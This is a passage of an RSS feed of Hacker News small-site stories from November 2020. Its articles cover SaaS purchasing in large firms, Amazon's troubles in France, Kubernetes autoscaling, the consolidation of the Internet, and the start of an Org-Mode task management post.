<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 15 Nov 2020 04:22:56 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 15 Nov 2020 04:22:55 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[SaaS Needs a Single Point of Purchase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081711">thread link</a>) | @alangibson
<br/>
November 13, 2020 | https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html | <a href="https://web.archive.org/web/*/https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href="/2020/11/13/saas-needs-a-single-point-of-purchase.html">
	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

<p><a href="https://news.ycombinator.com/item?id=25081711">Hacker News Discussion Thread</a></p>


</div></div>]]>
            </description>
            <link>https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081711</guid>
            <pubDate>Fri, 13 Nov 2020 13:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon under fire in France as coronavirus restrictions hit rivals]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081674">thread link</a>) | @Pick-A-Hill2019
<br/>
November 13, 2020 | https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>Amazon is trying to fend off a wave of criticism in France as small and large businesses, opposition politicians and members of the government accuse the company of unfairly benefiting from lockdown restrictions.</p>



<p>Frédéric Duval, Amazon's country manager for France, went on a media tour Thursday, telling multiple outlets the company was subject to “fantasies” about its allegedly dominant position in e-commerce.</p>



<p>The tour comes after a chorus of attacks from ministers and opposition figures who said that Amazon could benefit from rules banning the selling of "non-essential" items such as books and makeup products in physical stores.</p>



<p>On Monday, Culture Minister Roselyne Bachelot announced that the government would reduce postal fees to <a href="https://minefi.hosting.augure.com/Augure_Minefi/r/ContenuEnLigne/Download?id=2CC3C034-4B93-4D9E-B73D-5FA3F5C86F25&amp;filename=360%20-%20LE%20GOUVERNEMENT%20MET%20EN%20PLACE%20LA%20PRISE%20EN%20CHARGE%20DES%20FRAIS%20D%E2%80%99EXP%C3%89DITION%20DE%20LIVRES%20DES%20LIBRAIRIES%20IND%C3%89PENDANTES.pdf" target="_blank">facilitate</a> ordering from local bookshops. “Amazon is gorging itself. It’s up to us to not feed it,” she said. </p>



<p>Paris Mayor Anne Hidalgo, who has argued for keeping bookstores open, called for a boycott of the American company.</p>



<p>“We’re absolutely not a dominant player,” <a href="https://www.rtl.fr/actu/economie-consommation/confinement-on-n-est-absolument-pas-un-acteur-dominant-assure-le-dg-france-d-amazon-7800917290" target="_blank">Duval told French radio RTL</a>. According to Kantar, Amazon’s share of France's e-commerce market was 22.2 percent last March.</p>



<p>Retailers also partook in the roast. Supermarket chain Intermarché launched full-page newspaper ads on Thursday titled “Sorry, Amazon” to announce it would also <a href="https://www.bfmtv.com/economie/entreprises/desole-amazon-intermarche-lance-un-drive-solidaire-pour-aider-les-petits-commercants_AD-202011050183.html" target="_blank">help small businesses</a> index and sell their products digitally.</p>



<p>But Amazon has also presented offers and training measures to help French businesses sell online — through Amazon, of course. </p>



<p>Duval described these policies in an interview to Le Parisien, insisting that “we are in no way an adversary to the state. Amazon.fr is a French business based in France."</p>



<p><strong>Local opposition</strong></p>



<p>Amazon is also fighting on local fronts. </p>



<p>This week, tensions have flared around the Alsatian town of Ensisheim near Strasbourg, where a planned 190,000-square-meter warehouse is reportedly being built for Amazon.</p>



<p>Duval denied his company had plans for expansion in Alsace. But on Wednesday, the ecologist-led greater metropolitan area of Strasbourg name-checked the company when it joined the opposition to the project, stressing its attachment to “ecological transition."</p>



<p>Pascal Lacombe, spokesman from the Chaudron des Alternatives, a grassroots organization that joined a protest against the construction on Thursday, said: “It’s the Amazon model in its totality that we refuse.” He cited tax avoidance, surges in traffic and lack of local concentration as areas of concern.</p>



<p>One sore spot for Amazon in France has been conditions at its warehouses and conflicts with unions. In the country, where Amazon runs seven warehouses, a <a href="https://www.politico.eu/article/french-court-upholds-order-limiting-amazon-deliveries-amid-coronavirus-risk/">lawsuit brought by unions</a> led to a <a href="https://www.politico.eu/article/amazon-shutdown-in-france-puts-squeeze-on-macron-government/">court defeat for the company in April</a>, prompting the company to shutter all of its France-based operations until at least May 13. The e-commerce giant threatened to take the case to the French supreme court but eventually <a href="https://www.huffingtonpost.fr/entry/amazon-reouverture-progressive-19-mai_fr_5ebeecd5c5b6c9b944f3e941" target="_blank">sealed a deal</a> with unions to reopen at the end of May.</p>



<p id="block-a2bc29c8-fdaa-47cb-a544-0cc3fe127a00">Not everyone is is going after Amazon, however.</p>



<p id="block-a2bc29c8-fdaa-47cb-a544-0cc3fe127a00">During a question-and-answer session in the Senate on Wednesday, Digital Junior Minister Cédric O went to bat for the company, saying: “The French psychosis on Amazon makes no sense. E-commerce is 10 percent of commerce in France; Amazon is 20 percent of e-commerce. There is no European country where Amazon is lower than France."</p>



<p id="block-f2b7805d-af6e-43b0-b7ec-fc47349f416e"><a href="https://www.politico.eu/article/france-reinstates-digital-tax-courting-trade-war/">President Emmanuel Macron's government is aware of the influence of digital giants</a> and has repeatedly criticised the fact that they emerge as the big winners from the crisis during the first wave of coronavirus crisis.&nbsp;</p>



<p id="block-88d90152-de1f-40db-9282-a5d41050ee81">Bercy is backing at the EU level a reform of competition rules to regulate the <a href="https://www.politico.eu/article/digital-services-act-brussels-plan-to-rein-in-big-tech-takes-shape-thierry-breton-margrethe-vestager/">so-called gatekeepers</a>, of which Amazon is a part.&nbsp;</p>



<p><em>Additional reporting by Elisa Braün and Laura Kayali.</em></p>



<p><em>Want more analysis from <span>POLITICO</span>? <span>POLITICO</span> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="https://www.politico.eu/cdn-cgi/l/email-protection#ea9a9885aa9a8586839e838985c48f9f" target="_blank"><span data-cfemail="3e4e4c517e4e5152574a575d51105b4b">[email&nbsp;protected]</span></a> to request a complimentary trial.</em></p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081674</guid>
            <pubDate>Fri, 13 Nov 2020 12:58:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding Kubernetes Autoscaling – A Primer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081447">thread link</a>) | @thechiefio
<br/>
November 13, 2020 | https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/ | <a href="https://web.archive.org/web/*/https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><p>Kubernetes provides a series of features to ensure your clusters have the right size to handle any type of load. In this blog post, we will look into the different auto-scaling tools provided by Kubernetes and learn the difference between the horizontal pod autoscaler, the vertical pod autoscaler and Kubernetes Nodes autoscaler.</p><p>Developers use Kubernetes to ship faster to their users and respond to their requests as quickly as possible. You design the capacity of your cluster on the estimated load your users will generate on it. But imagine your service went viral, and the number of requests grows faster than you ever imagined. You risk running out of compute resources, your service might slow down, and users may get frustrated.</p><p>When you allocate resources manually, your responses may not be as quick as required by your application's changing needs. This is were Kubernetes Autoscaling comes in: Kubernetes provides multiple layers of autoscaling functionality: Pod-based scaling with the Horizontal Pod Autoscaler and the Vertical Pod Autoscaler, as well as node-based with the Cluster Autoscaler. It automatically scales up your cluster as soon as you need it and scales it back down to its regular size when the load is lower. These layers ensure that each pod and cluster has the right performance to serve your current needs.</p><h3><b>Create Kubernetes clusters in seconds:</b></h3><p><a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">ðŸ‘‰ Create an account</a></p><h2><b>Kubernetes Architecture</b></h2><p>In Kubernetes, a set of machines for running containerized applications is called <b>Cluster</b>. A cluster contains, at minimum, a <b>Control Plane</b> and one or several <b>Nodes</b>. The control plane maintains the clusters' desired state, such as which applications run on them and which images they use. The nodes are either virtual or physical machines that run the applications and workloads, called <b>Pods</b>. Pods consist of containers that request compute resources such as CPU, Memory, or GPU.</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.3.width-1024.format-webp.webp" width="1024" height="631" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.38.36.png"></p></div></section><section><div><p>For more information to the different Kubernetes components, refer to our dedicated blog post: <a href="https://blog.scaleway.com/an-introduction-to-kubernetes/"><i>An introduction to Kubernetes</i></a></p><h2><b>Horizontal vs. Vertical Scaling</b></h2></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.3.width-1024.format-webp_8dgTO9K.webp" width="1024" height="218" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.39.17.png"></p></div></section><section><div><ul><li><b>Horizontal Scaling</b> means modifying the compute resources of an existing cluster, for example, by adding new nodes to it or by adding new pods by increasing the replica count of pods (Horizontal Pod Autoscaler).</li><li><b>Vertical Scaling</b> means to modify the attributed resources (like CPU or RAM) of each node in the cluster. In most cases, this means creating an entirely new node pool using machines that have different hardware configurations. Vertical scaling on pods means dynamically adjusting the resource requests and limits based on the current application requirements (Vertical Pod Autoscaler).</li></ul><h3><b>Horizontal Pod Autoscaler</b></h3><p>The <a href="https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/">Horizontal Pod Autoscaler (HPA)</a> is able to scale the number of pods available in a cluster to handle the current computational workload requirements of an application. It determines the number of pods needed based on metrics set by you and applies the creation or deletion of pods based on threshold sets. In most cases, these metrics are CPU and RAM usage, but it is also possible to specify your custom metrics. The HPA checks continuously the CPU and memory metrics generated by the <code>metrics-server</code> installed in the Kubernetes cluster.</p><p>If one of the specified thresholds is met, it updates the number of pod replicas inside the deployment controller. Following the updated number of pod replicas, the deployment controller will scale up or down the number of pods until the number of replicas matches the desired number. In case you want to use custom metrics to define rules on how the HPA handles scaling your pods, your cluster needs to be linked to a time-series database holding the metrics you want to use. Please note that Horizontal Pod Autoscaling can not be applied to objects that can not be scaled like, for example, DaemonSets.</p><h3><b>Vertical Pod Autoscaler</b></h3><p>The <a href="https://github.com/kubernetes/autoscaler/blob/master/vertical-pod-autoscaler/README.md">Vertical Pod Autoscaler (VPA)</a> can allocate more (or less) CPU and memory resources to existing pods to modify the available compute resources for an application. This feature can be useful to monitor and adjust the allocated resources of each pod over its lifetime. The VPA comes with a tool called <i>VPA Recommender</i>, which monitors the current and past resource consumption and use this data to provide recommended CPU and memory resources to be allocated for the containers. The Vertical Pod Autoscaler does not update resource configurations for existing pods. It checks which pods have the correct resource configuration and kills the ones that are not having the recommended configuration so that their controllers can recreate them with the updated configuration.</p><p>When you want to use the HPA and VPA both at the same time to manage your container resources, you may put them in a conflict which each other when using the same metrics (CPU and memory). Both of them will try to solve the situation simultaneously, resulting in a wrong allocation of resources. However, it is possible to use them both if they rely on different metrics. The VPA uses CPU and memory consumption as unique sources to gather the perfect resource allocation, but the HPA can be used with custom metrics so both tools can be used in parallel.</p><h3><b>Kubernetes Nodes Autoscaler</b></h3><p>The Kubernetes Nodes Autoscaler adds or removes nodes in a cluster based on <b>all pods' requested resources</b>. It is possible to define a minimum and a maximum number of nodes available to the cluster from the <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Scaleway Elements console</a>.</p><p>While the Horizontal and Vertical Pod Autoscalers allow you to scale pods, the Kubernetes Node Autoscaler scales your clusters nodes, based on the number of pending pods. The CA checks to see whether there are any pending pods and increases the cluster's size so that these pods can be created. It also deallocates idle nodes to keep the cluster at the optimal size. The Nodes Autoscaler can request to deploy new nodes directly in your pool, within the given resource limits (if any).</p><p><b>Cluster upscaling</b><br>If pods are scheduled for execution, the Kubernetes Autoscaler can increase the number of machines in the cluster to avoid resource shortage. The diagram below illustrates how a cluster can be automatically upscaled:</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp.webp" width="1024" height="674" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.40.40.png"></p></div></section><section><div><p>As illustrated, two pods are scheduled for execution but the current node's compute capacity is reached. The cluster autoscaler automatically scans all nodes for scheduled pods. It requests provision of a new node if three conditions are met:</p><ul><li>Some pods failed to schedule on any of the existing nodes due to insufficient available resources.</li><li>Adding a node with the same specifications as the current ones help to redistribute the load.</li><li>The cluster has not reached the user-defined maximum node count.</li></ul><p>Once the node is deployed and detected by the Kubernetes Control Plane, the scheduler allocates the pending pods to the cluster's new node. In case there are still some pending pods, the autoscaler repeats these steps as often as required.</p><p><b>Cluster downscaling</b><br>The Kubernetes Cluster Autoscaler decreases the number of nodes in a cluster when some are considered not necessary for a pre-defined amount of time. To be considered unnecessary, a node must have low utilization, and all of its important pods can be moved elsewhere without resource shortage. The node scaledown check takes into account the resource requests made by the pods, and if the Kubernetes scheduler decides that the pods can be moved somewhere else, it removes the node from the cluster to optimize resource usage and to reduce costs. If you have defined a minimum number of active nodes in the cluster, the autoscaler will not reduce the number of nodes below this threshold.</p><h2><b>Configuring Autoscaling</b></h2><p>You can configure <b>Cluster Autoscaling</b> directly from your <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Scaleway Elements</a> console.</p><p><b>During Cluster creation:</b><br>To enable Kubernetes Cluster Autoscaling during the creation of a new cluster, head to step 5 in the cluster creation form, toggle the switch, and set the minimum and maximum resources available for your cluster:</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_qeW7ln8.webp" width="1024" height="452" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.41.40.png"></p></div></section><section><div><p><b>On an existing Cluster:</b></p><ol><li>From your cluster information page, click on the <b>Pools</b> tab and select the pool to modify. Click <b>Edit</b> in the pools drop-down menu to configure the pool:</li></ol></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_xc3CXr1.webp" width="1024" height="238" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.43.11.png"></p></div></section><section><p>2. Toggle on the <b>Autoscale the number of nodes</b> switch and set the desired number of minimum and maximum resources available for the pool:</p></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_mpliKry.webp" width="1024" height="1284" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.44.21.png"></p></div></section><section><div><ol><li>Confirm the the modification of the pool by clicking on <b>Update pool.</b></li></ol><h2><b>Conclusion</b></h2><p>You now understand the basics of Kubernetes Autoscaling features and how you can use them to configure your cluster for maximum performances.</p><p>Deploy your first <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Kubernetes Kapsule Cluster</a> directly from your Scaleway console and try out the Autoscaling feature.</p></div></section><section><div><h4><b>Article written by</b></h4><h4><a href="https://medium.com/@olgapetrova_92798"><b>Olga Petrova</b></a></h4><p>Quantum physicist turned Machine Learning engineer. Currently doing AI for @Scaleway, a French cloud provider. <a href="https://www.linkedin.com/in/olga-p-petrova/">Her linkedIn</a>.</p></div></section></div></div>]]>
            </description>
            <link>https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081447</guid>
            <pubDate>Fri, 13 Nov 2020 12:22:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Origins of the Internet: The Backbone]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081374">thread link</a>) | @chmaynard
<br/>
November 13, 2020 | https://technicshistory.com/2020/11/13/the-backbone-conclusion/ | <a href="https://web.archive.org/web/*/https://technicshistory.com/2020/11/13/the-backbone-conclusion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>And so we reach the conclusion of “The Backbone,” my story of the origins of the Internet<a href="#fn1" id="fnref1"><sup>1</sup></a>. We have seen the basic arc of the Internet’s development from the 1960s to the 1990s – nurtured in its youth by the government, given room to grow to fruition by the unravelling of the power of the Bell system, and finally emerging into public view in a frenzy of growth which smothered all potential competitors. Over the course of those decades, users repeatedly co-opted systems built in order to expand and share access to machine resources (time-sharing operating systems, ARPANET, and NSFNET), to use them instead for interpersonal communication – message boards and electronic mail.</p>
<p>In 1995, the National Science Foundation (NSF) successfully extricated itself from the network operations business while preserving a single, unitary Internet, composed of many heterogeneous but interlaced parts – networks owned by a variety of corporations; and websites and other services provided by an even wider variety of participants: hobbyists, local governments, small businesses, and more.</p>
<p>The Internet’s self-image coalesced in these years of its adolescence. It was distributed, decentralized, and decentralizing. Its most vocal proponents argued that its technological structure, which privileged the edges over the center, would replicate itself in new political structures, eroding the foundations of incumbent institutional power and enabling direct, disintermediated communication and market transactions between individuals. Louis Rossetto, editor of <em>Wired</em>, <em>the</em> magazine of the technologically-enlightened, put it this way:</p>
<blockquote>
<p>This new world is characterized by a new global economy which is inherently anti-hierarchical and decentralist, and disrespects national boundaries or the control of politicians and bureaucrats or power mongerers of any; and by a global, networked consciousness that is creating a new kind of democracy for achieving social consensus that is turning the bankrupt electoral politics we are witnessing this year into a dead end. …a global hive mind that is arriving at a new, spontaneous order<a href="#fn2" id="fnref2"><sup>2</sup></a>.</p>
</blockquote>
<p>This set of libertarian ideas found expression in statements repeated and replicated so often that they became a kind of scripture of the Internet: the book of David Clark (“We reject: kings, presidents, and voting. We believe in: rough consensus and running code.”); the book of John Perry Barlow (“Governments of the Industrial World, you weary giants of flesh and steel, I come from Cyberspace, the new home of Mind. ….You are not welcome among us. You have no sovereignty where we gather.”); the book of John Gilmore (“The Net interprets censorship as damage and routes around it.”).</p>
<p>These ideas took root, as I have said, when the Internet remained yet in its adolescent state – simultaneously a single, interconnected system, yet robustly heterogeneous in its structure at every level. Over the following fifteen years, its heterogeneity would diminish, with power over the network and its applications consolidating in a few key corporations<a href="#fn3" id="fnref3"><sup>3</sup></a>.</p>
<h2 id="boom-networks-consolidate">Boom: Networks Consolidate</h2>
<p>As the popularity of the Internet exploded in the second half of the 1990s, a river of capital flowed into Silicon Valley in search of the huge returns promised by the unheard of yearly growth of digital traffic. The theory of the time held that, because of the global reach of the Internet and the power of network effects (e.g., Metcalfe’s Law), the first mover to occupy any given sector of online business would dominate it. According to this doctrine, short-term losses – even on per-unit sales basis – were irrelevant, even desirable. Only growth mattered, because growth could always be turned into profits later, once all potential competitors had dwindled into irrelevance<a href="#fn4" id="fnref4"><sup>4</sup></a>. This encouraged a gold rush mentality among investors, what we would now call FOMO, and attracted large amounts of money to such questionable enterprises as Priceline, Boo, and eToys, despite their evident lack of profitability.</p>
<p>Underneath this highly visible froth of increased application diversity, however, the deep current of network infrastructure flowed in the opposite direction, towards consolidation. The boom in web properties in the second half of the 1990s found its echo in a boom in fiber optic network construction. The telecom carriers, new and old, all wanted a piece of the exponential growth in data traffic promised by the rocket-like rise of the World Wide Web. The incumbent telecommunications carriers, freed from their silos by the 1996 Telecom Act, did not, as might have been hoped, use the opportunity to unleash their claws in all-out competitive battle, cutting profits to the bone to the benefit of their users. Markets may thrive on competition, but firms much prefer monopoly. And so the RBOCs and long-distance carriers, split apart in 1984, re-assembled themselves into giants with tremendous market power. Southwestern Bell absorbed Ameritech, Pacific Telesis, BellSouth, and finally AT&amp;T, and then took the name of that former parent company. Bell Atlantic and NYNEX merged, then acquired GTE<a href="#fn5" id="fnref5"><sup>5</sup></a>, taking on at the same time a new moniker, Verizon. Of the former RBOCs, only US West remained an independent company.</p>
<p>While Southwestern Bell and Bell Atlantc re-assembled the scattered parts of AT&amp;T into a pair of Frankenstein’s monsters, another would-be giant was busy absorbing the various internet service providers that had flourished in the first half of the 1990s. In 1983, Bernie Ebbers, who had made his first fortune as the owner of a dozen hotels, co-founded Long Distance Discount Services (LDDS) to compete in the market newly opened by the AT&amp;T break-up, targeting long-distance service for small and medium-sized businesses. Over the ensuing decade, LDDS acquired a variety of other competitors, achieving fourth place in size among long-distance carriers behind AT&amp;T, MCI, and Sprint. In the first days of the Internet boom, it took on a new name – WorldCom – thus announcing its newly hubristic ambitions. A new, much more extravagant buying spree ensued, using WorldCom’s its bubble-inflated stock to acquire one major network after another. In 1996, it bought Metropolitan Fiber Systems (MFS), which had itself just acquired major Internet provider UUNET. The acquisition of CompuServe’s network infrastructure from H&amp;R block followed in 1997, along with the acquisition of the former NSFNET backbone operator, ANS, from AOL. The biggest purchase of all came in 1998, when WorldCom merged with MCI. After the market crash – and bankruptcy and scandal and prison<a href="#fn6" id="fnref6"><sup>6</sup></a> – Verizon absorbed the wreckage of Bernie Ebbers’ conglomerate in 2006.</p>
<p>Finally, the cable television providers, though more historically localized in ownership than the rest of the telecom business, underwent a similar trend towards consolidation, with acquisitions across previously siloed markets making possible behemoths like Time Warner and Comcast; the latter became simultaneously the largest internet service provider and the largest pay-TV company in the U.S., to say nothing of its media holdings.</p>
<p>And so, by the mid-2000s, the diverse structure of peer networks which had characterized the early Internet in the U.S. had merged into a handful of major providers. At the retail level, as broadband networking replaced dial-up, most consumers had access to only one or two relevant ISPs – their local telephone and cable company – and nationally two companies dominated each of those sectors; Verizon and AT&amp;T on the one hand, and Comcast and Time Warner on the other.</p>
<h2 id="bust-applications-consolidate">Bust: Applications Consolidate</h2>
<p>Many of the first-generation dot-coms might have survived had they been allowed to grow gradually. But the gold rush theory was antithetical to anything but hypergrowth. So, when the crash came, most were caught with huge expenses and excess capacity due to overinvestment, and they quickly collapsed. A vigorous winnowing took place, with a great deal of chaff sifted out and only a few grains of wheat left behind.</p>
<p>Over the following decade, a new much more stable order emerged. Five giant companies came to dominate the application layer of the Internet. Two of them were dot-com era survivors. Google, founded in 1998, had raised the bar on what it meant to be a search engine by extracting ranking information from the structure of the Web and its skein of links, rather than merely from the content of individual pages. Through a series of further innovations and acquisitions, it leveraged its dominance in search into a powerful position in mobile computing, email, streaming video, and, of course, advertising. Amazon, founded as a book retailer in 1994, developed a world-beating logistical operation which it used to undercut competitors on price and delivery speed, then expanded into virtually every retail sector, and finally created a set of tools for hosting third-party applications that defined the new, and very lucrative, business of cloud computing.</p>
<p>Two of the other giants had come of age during the personal computing era, a decade before the commercial Internet. Microsoft took an early lead in the so-called “browser wars” of the mid-90s, but more important long-term was its continued dominance of business software, even as those businesses began to move their operations on-line. Apple Computer, made largely irrelevant in the 1990s by the dominance of Windows, seemed destined to a gradual decline into senescence. But it was rejuvenated by its successes with the iPod and iTunes, and then developed the most profitable mobile computing device to this day, the iPhone.</p>
<p>The final dominant power, Facebook, was the only one to come out of the second wave boom in Internet investment in the second half of the 2000s. It grew rapidly across college campuses before colonizing the wider world, and becoming the primary way that many millions of people keep in touch with people outside their immediate family and close friends. It has since acquired other …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://technicshistory.com/2020/11/13/the-backbone-conclusion/">https://technicshistory.com/2020/11/13/the-backbone-conclusion/</a></em></p>]]>
            </description>
            <link>https://technicshistory.com/2020/11/13/the-backbone-conclusion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081374</guid>
            <pubDate>Fri, 13 Nov 2020 12:01:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Org-Mode Workflow: Task Management]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081372">thread link</a>) | @mromanuk
<br/>
November 13, 2020 | https://whhone.com/posts/org-mode-task-management/ | <a href="https://web.archive.org/web/*/https://whhone.com/posts/org-mode-task-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
			
<main role="main">
	<article>
		<div>
			<p>As mentioned in the <a href="https://whhone.com/posts/from-evernote-to-org-mode/">last post</a>, I switched to Org-Mode.  I kept adjusting my workflow with this new tool and it has been stabilized for a month. I think it is time to talk about the new workflow for task/time management with Org-Mode. This blog post consists of four parts: the principles, the definitions, the workflows, and finally the implementations.</p>
<h2 id="1-the-principles">1 The Principles</h2>
<p>Principles remain valid no matter what the tool is.</p>
<h3 id="11-do-not-add-tasks-indiscriminately">1.1 Do Not Add Tasks Indiscriminately</h3>
<p>Not every task should go into the system. Avoid filling the system with bullshits and hiding the things that matter. I only add tasks that I really want or need to do.</p>
<p>To clarify<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, the task management system describled below is not the “inbox” in GTD. I still capture things into my inbox but not all of them will be converted to a task in the task management system (org agenda files) eventually.</p>
<h3 id="12-not-all-tasks-have-to-be-done">1.2 Not All Tasks Have To Be Done</h3>
<p>There are two reasons for this. First, tasks could be deprioritized or even become unnecessary. Second, we have limited time and cannot do everything. We should have an opinion on the priority.</p>
<h3 id="13-reduce-the-number-of-open-loop">1.3 Reduce The Number Of Open Loop</h3>
<p>Open loops are tasks that have been started but not finished. They stay in our minds and occupy some of our limited working memory so that we cannot focus on another task we are working on.</p>
<p>Also, open loops reduce agility, according to <a href="https://en.wikipedia.org/wiki/Little%27s_law">Little’s Law</a>. The more the open loops, the longer time finish each of them on average.</p>
<h3 id="14-reduce-decision-making-of-what-to-do-next">1.4 Reduce Decision Making Of What To Do Next</h3>
<p>The system should suggest to the user what to do next so that the user can reserve the will power to the real task. This also avoids skipping hard tasks with easy tasks unconsciously.</p>
<h2 id="2-the-definitions">2 The Definitions</h2>
<p>Each task in Org-Mode has a <a href="https://orgmode.org/manual/Workflow-states.html">TODO keyword</a>, optionally <a href="https://orgmode.org/manual/Deadlines-and-Scheduling.html">a scheduled date, and a deadline</a>. For example,</p>
<div><pre><code data-lang="org">*<span> PROG Write a blog post on task management with Org-Mode</span>
DEADLINE: &lt;<span>2020-11-07 Sat</span>&gt; SCHEDULED: &lt;<span>2020-10-31 Sat</span>&gt;
</code></pre></div><p>Each Org-Mode user could define their own set of TODO keywords and use scheduled dates and deadlines differently. For example, some people use only two TODO keywords, “TODO” and “DONE”, while some use more. Some people set “scheduled dates” to all the tasks while some people set it to some of the tasks. These nuances could result in a very different workflow, although they are using the same Org-Mode. Let’s take a look at how I use them.</p>
<h3 id="21-todo-keywords">2.1 TODO Keywords</h3>
